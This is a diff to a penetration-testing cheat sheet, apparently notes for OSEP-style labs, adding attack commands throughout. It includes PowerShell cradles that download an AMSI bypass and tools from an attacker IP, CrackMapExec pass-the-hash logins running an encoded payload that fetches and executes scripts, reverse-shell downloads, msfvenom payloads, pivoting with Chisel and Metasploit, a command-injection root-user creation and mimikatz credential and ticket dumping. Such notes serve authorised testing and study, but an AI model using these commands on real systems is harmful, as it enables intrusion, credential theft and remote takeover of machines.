@@ -20,7 +20,7 @@ Edit 2021/11: I'm going through OSEP challenges and as so, Im updating this with
 
 ## General enumeration
 
-### Network discoverie
+### Network discovery
 
 #### Nmap
 
@@ -80,7 +80,22 @@ for host in {1..255}; do
         (echo > /dev/tcp/"${subnet}.${host}/${port}") > /dev/null 2>&1 && echo "Host ${subnet}.${host} has ${port} open" || echo "Host ${subnet}.${host} has ${port} closed"
     done
 done
-```                
+```
+
+### Powershell
+
+#### By using Invoke-PortScan (PowerSploit)
+
+```powershell
+$topports="50";$target="192.168.42.43,192.168.42.44,172.16.44.42,172.16.1.1,172.16.255.253";$attacker="192.168.42.42";IEX(New-Object Net.Webclient).downloadString("http://$attacker/4msibyp455.ps1");IEX(New-Object Net.Webclient).downloadString("http://$attacker/Invoke-Portscan.ps1");Invoke-Portscan -Hosts "$target" -TopPorts "$topports"
+```
+
+#### Leverage Native Powershell
+
+```powershell
+$target = '192.168.42.42';$scanPorts = @('80', '8080', '443', '8081', '3128', '25', '5985', '5986', '445', '139'); foreach($port in $scanPorts){Test-NetConnection -ComputerName $target -InformationLevel "Quiet" -Port $port}
+```
+
 ### Banner grabbing (without nmap)
 
 If nmap didn't grab banners (or is not installed), you can do it with `/dev/tcp/ip/port` `/dev/udp/ip/port` or by using telnet.
@@ -101,6 +116,7 @@ telnet 192.168.30.253 22
 SSH-2.0-OpenSSH_6.2p2 Debian-6
 ^C pressed here
 ```
+
 ### Web directorie/file scanner
 
 #### Gobuster
@@ -182,6 +198,43 @@ smbmap -H 192.168.24.24
 Or having an user:
 smbmap -u ceso -H 192.168.24.24
 ```
+
+### Login through CIFS/WinRM/PSSession
+#### CrackMapExec - WinRM
+
+With Hash
+
+```console
+crackmapexec winrm 172.16.80.24 -u administrator -H 09238831b1af5edab93c773f56409d96 -x "ipconfig"
+```
+
+With Password (Example gets a reverse shell)
+
+```console
+crackmapexec winrm 172.16.80.24 -u brie -p fn89hudi1892r -x "powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgAxADAANwAvAG4AaQBlAHIAaQAuAHAAcwAxACIAKQA7AEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAwADcALwByAHUAbgAtAHMAaABlAGwAbABjAG8AZABlAC0ANgA0AGIAaQB0AHMALgBwAHMAMQAiACkACgA="
+```
+
+#### CrackMapExec - SMB
+
+With Hash
+
+```console
+crackmapexec smb 172.16.21.22 -u gouda -H 09238831b1af5edab93c773f56409d96 -x "powershell.exe IEX(New-Object Net.Webclient).downloadString('http://192.168.42.42/4msibyp455.ps1');IEX(New-Object Net.Webclient).downloadString('http://192.168.42.42/dameelreversooo.ps1')"
+```
+
+With Hash + Domain
+
+```console
+crackmapexec smb 172.16.21.22 -d example.com -u cuartirolo -H 09238831b1af5edab93c773f56409d96 -x "whoami"
+```
+
+With password
+
+```console
+smb 172.16.21.22 -u administrator -p fn89hudi1892r -x "powershell.exe IEX(New-Object Net.Webclient).downloadString('http://192.168.42.42/dameelreversooo.ps1')"
+```
+
+####
 
 #### Version (nmap didn't detect it)
 
@@ -355,7 +408,7 @@ Connect it:
 ```console
 sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFil
 e('http://192.168.42.42/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=example\ceso password=soyUnaPassword
-````
+```
 
 ## Pivoting
 
@@ -400,6 +453,33 @@ Later on is possible to connect from the local machine:
 ssh foo@192.168.25.74
 ```
 
+### Chisel with remote port forward from machine in the net
+
+On attacker machine I start up a chisel reverse server on port 9050 (imagine this machine IP is 192.168.90.90)
+```console
+server -p 9050 --reverse
+```
+
+On compromised machine in the network I start a client connection against the server running in the attacker.
+The command below will be forwarding the traffic from port 8081 in the machine 172.16.42.90 throughout the compromised machine (via localhost in port 5050) to the attacker.
+
+```console
+./chisel client 192.168.90.90:9050 R:127.0.0.1:5050:172.16.42.90:8081
+```
+
+### Metasploit: autoroute + socks_proxy
+
+```background
+use post/multi/manage/autoroute
+set session 8
+run
+use auxiliary/server/socks_proxy
+run -j
+```
+
+The SRVPORT of socks_proxy must match the one configured in proxychains.conf as the VERSION used as well.
+
+
 ## Reverse shells
 
 ### php
@@ -436,7 +516,7 @@ msfvenom -p cmd/unix/reverse_perl LHOST="192.168.42.42" LPORT=443 -f raw -o reve
 msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
 ```
 
-### Windows HTPP download reverse shell
+### Windows HTTP download reverse shell
 
 ```console
 msfvenom -a x86 --platform windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed BufferRegister=EAX -f python
@@ -448,13 +528,13 @@ msfvenom -a x86 --platform windows -p windows/exec CMD="powershell \"IEX(New-Obj
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
  ```
 
- ### Windows stageless reverse TCP
+### Windows stageless reverse TCP
 
  ```console
  msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o <output_name.format>
  ```
 
- ### Linux staged reverse TCP
+### Linux staged reverse TCP
 
  ```console
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o <outout_name>.elf
@@ -537,7 +617,7 @@ Now, decrypt the custom passwd overwritting in the process the real one (`/etc/p
 cd /
 /home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
 ```
-    
+
 And finally, just login with the user created with root privileges by using `customPassword`:
 
 ```console
@@ -547,7 +627,7 @@ su - ceso
 #### Command web injection: add user
 
 ```console
-/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 
+/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i
 ```
 
 #### NFS; no_root_squash,insecure,rw
@@ -620,7 +700,7 @@ echo %PROCESSOR_ARCHITECTURE%
 ### Powershell  running as 32 or 64 bits
 
 ```console
-[Environment]::Is64BitProcess   
+[Environment]::Is64BitProcess
 ```
 
 ### Linux LFI - intesresting files to look after
@@ -715,7 +795,7 @@ powershell.exe -exec bypass
 ### Encode Powershell b64 from Linux
 
 ```console
-echo 'ImAnEviCradleBuuhhhh' | iconv --to-code UTF-16LE | base64 -w0
+echo 'ImAnEviCradleBuuhhhh' | iconv -t UTF-16LE | base64 -w0
 ```
 
 ### Encode/Decode b64 in Windows WITHOUT Powershell
@@ -870,8 +950,19 @@ ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
 --> account_sid: SID of the object the ACE is applying, is the SID of the user or group to the one permissions are being assigned, sometimes there are acronyms of well known SID's instead of numerical ones
 ```
 
+### BloodHound
+
+```powershell
+$attacker="192.168.42.37";$domain="example.com";IEX(New-Object Net.Webclient).downloadString("http://$attacker/4msibyp455.ps1");IEX(New-Object Net.Webclient).downloadString("http://$attacker/SharpHound.ps1");Invoke-BloodHound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain $domain
+```
+
 ### PowerView methods for enumeration
 
+This is the command for download injected into memory with an AMSI Bypass before
+
+```powershell
+$user="userNameHereIfQueryUsesIt";$attacker="192.168.49.107";$dominio="example.com";IEX(New-Object Net.Webclient).downloadString("http://$attacker/nieri.ps1");IEX(New-Object Net.Webclient).downloadString("http://$attacker/PowerView.ps1");OneOfThePowerViewCmdsFromBelowHere
+```
 #### ACLs
 
 ```console
@@ -926,7 +1017,7 @@ Get-DomainTrustMapping <-- Automate the process of enumeration for all forest tr
 ```console
 Get-DomainSID <-- Get the SID of the current domain
 Get-DomainSID -Domain example.com <-- Get the SID of example.com
-``` 
+```
 
 ### Exploitation
 
@@ -950,7 +1041,7 @@ mimikatz.exe "sekurlsa::logonpasswords" exit
 1 - Enumerate if there if there is unconstrained delegation
 2 - If there is, open mimikatz (commands blow are inside it)
 3 - privilege::debug <-- Enable debug
-4 - sekurlsa::tickets <-- List all the present tickets 
+4 - sekurlsa::tickets <-- List all the present tickets
 5 - Through phishing or visit of a page, if the user has Windows Auth then it will use kerberos
 6 - sekurlsa::tickets <-- Verify if there are new TGT's
 7 - sekurlsa::tickets /export <-- If new TGT and marked as forwardable export them to disk
